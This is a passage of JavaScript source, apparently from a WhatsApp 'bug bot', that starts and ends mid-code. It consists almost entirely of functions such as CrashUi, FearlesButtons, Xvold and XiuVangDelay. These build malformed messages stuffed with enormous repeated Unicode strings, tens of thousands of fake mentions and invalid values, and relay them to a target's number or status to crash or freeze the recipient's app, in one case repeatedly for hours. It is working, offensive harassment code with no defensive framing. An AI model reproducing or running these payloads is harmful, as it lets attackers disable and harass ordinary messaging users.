            participant: target,
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from(
              { length: 1990 },
              () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
                ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
              }
            },
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣" + "꧀".repeat(9999),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: target }
  };

  const pnxMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(pnx),
    {
      userJid: target
    }
  );
  await sock.relayMessage(
    target,
    pnxMessage.message,
    {
      messageId: pnxMessage.key.id
    }
  );
}
async function CrashUi(sock, target) {
  const killer = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: false,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" + "ꦾ".repeat(15000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯\",\"sections\":[{\"title\":\"ϟ\",\"rows\":[]}]}",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"️DOCUMENT\",\"flow_id\":\"BY XIAA4YOUUSX\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
              }
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(killer), { userJid: target });
  try {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.error("Error in Bug System Ui:", err);
  }
} 
async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "ીꦽ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sock.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
 async function FearlesAndroid(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(60000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongtitude: 0,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "Hai Idiot ini dapaa?" + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: ""
              },
              {
                name: "call_permission_request",
                buttonParamsJson: ""
              },
            ],
          },
        },
      },
    },
  }, {});
  
  await sock.relayMessage(target, {
    groupInviteMessage: {
      inviteCode: "XxX",
      inviteExpiration: "18144000",
      groupName: " Hai Idiof Ini dapaa" + "ោ៝".repeat(20000),
      caption: "ោ៝".repeat(20000),
    },
  }, { participant: { jid: target }, });
}
async function FearlesButtons(sock, target) {
  const ButtonsFreeze = [
    { name: "single_select", buttonParamsJson: "" },
  ];

  for (let i = 0; i < 10; i++) {
    ButtonsFreeze.push(
      { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
    );
  }
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𒑡𝗙𝗲𝗮𝗿𝗹𝗲𝘀𝗢𝘃𝗲𝗿𝗹𝗼𝗮𝗱៚",
              locationMessage: {
                degreesLatitude: -0,
                degreesLongtitude: 0,
              },
              hasMediaAttachment: true,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () =>
                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
             stanzaId: "123",
             quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
              }
            },
            body: {
              text: "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              buttons: ButtonsFreeze,
              messageParamJson: "{".repeat(10000) 
            },
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(chalk.red(`Succes Sending Bug ButtonFreeze To ${target}`));
}
async function XiuVangDelay(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 100) {
            await Promise.all([
            protocolbug6(target, false),
            
            ]);
            console.log(chalk.red(`Send DurationTrick ${count}/100 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 100 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 100 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
async function xatanicaldelayv2(target, mention) {
console.log(chalk.blue(`Success Send Delay Hard V2 To ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function FolwareFunction(target, folware) {
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: folwaredellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg = generateWAMessageFromContent(target, MSG, MassageFolware, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function Xvold(target, mention) {
console.log(chalk.red(`Success Send Xvold To ${target}`));
const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));
 
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(670) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(670) + ".com",
        description: "\u0003".repeat(550),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "Stellar",
                body: "\u0003".repeat(10000),
                thumbnailUrl: "https://xnxx" + "ꦾ".repeat(630) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
let msg = await generateWAMessageFromContent(target,  {
                buttonsMessage: {
            text: "᭯".repeat(9741),
            contentText: "\u0000",
            footerText: "\u0000",
            buttons: [
                {
                    buttonId: "\u0000".repeat(911000),
                    buttonText: { displayText: "\u0000" + "\u0000".repeat(400000) },
                    type: 1
                }, 
                {
                     buttonId: "Stellar".repeat(911000), 
                     buttonText: { displayText: "\u0003" + "\u0000" + "᭯".repeat(200000) }, 
                     type: 1
                 }
            ],
            headerType: 1
        },
buttonsMessage: {
                    text: "❦",
                    contentText:
                        "Untukmu 2000tahun yang akan datang",
                    footerText: "darimu 2000tahun yang lalu",
                    buttons: [
                        {
                            buttonId: ".Stellar",
                            buttonText: {
                                displayText: "Stellar" + "\u0003".repeat(500000),
                            },
                            type: 1,

},
                    ],
                    headerType: 1,
                },
                
           }, {});
const mentionedList = [
"13135550002@s.whatsapp.net",
...Array.from({ length: 40000 }, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
];

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Stellar Delay",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🔴" },
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => 
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "333333333333@newsletter",
serverMessageId: 1,
newsletterName: "StellarInvis"
}
},
description: "Ciett Delayyyy"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};         


const embeddedMusic = {
musicContentMediaId: "589608164114571",
songId: "870166291800508",
author: ".𝑿𝒑𝒍𝒐𝒊𝒕𝒊𝒇𝒚𝑰𝒏𝒔𝒊𝒅𝒊𝒐𝒖𝒔" + "ោ៝".repeat(10000),
title: "Finix",
artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

        const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `☠️ - んジェラルド - ☠️`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };    {};


    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "Fuck_you_mark" },
                    content: undefined
                }
            ]
        });
    }
}

async function blankSticker(target) {
    await sock.relayMessage(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "X",
                name:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                stickers: [
                    {
                        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    }
                ],

                fileLength: "999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",

                directPath:
                    "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",

                contextInfo: {},

                packDescription:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞 ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                mediaKeyTimestamp: "1741150286",
                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

                thumbnailDirectPath:
                    "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",

                thumbnailSha256:
                    "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

                thumbnailEncSha256:
                    "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

                thumbnailHeight: 252,
                thumbnailWidth: 252,

                imageDataHash:
                    "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

                stickerPackSize: "999999999",
                stickerPackOrigin: "1"
            }
        }, { participant: { jid: target }});
    }
    
async function jixKntl(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title:
                            "‼️⃟̊  ༚Ꮡ‌‌ ⭑̤ ⟅̊ 𝚲𝐏͢𝐏𝚯𝐋͢𝚯݉ ، ▾ ► 𝚵𝐗͢𝐏𝐋𝚫͢𝐍𝚫𝐓͢𝚰𝚯𝚴͢𝚾  ◄ ⟆ ⭑̤" +
                            "ꦽ".repeat(45000),
                        description: "👀",
                        listType: 1,
                        singleSelectReply: {
                            selectedRowId:
                                " - dewi aku mohon beri kesempatan\n" +
                                "untuk bisa menebus dosaku kepadamu\n" +
                                "maafkanlah aku yg menyakitimu\n" +
                                "aku tidak pernah menyangka bisa begini"
                        },
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: "120363403393294060@newsletter",
                                severMessageId: "1",
                                newsletterName: "# How Do I Get Through This ?",
                                contentType: "UPDATE_LINK"
                            }
                        }
                    }
                }
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
}

async function HyperSixty(target, mention) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}

async function chatFrezze(sock, target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await sock.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{})
}

let xx = {
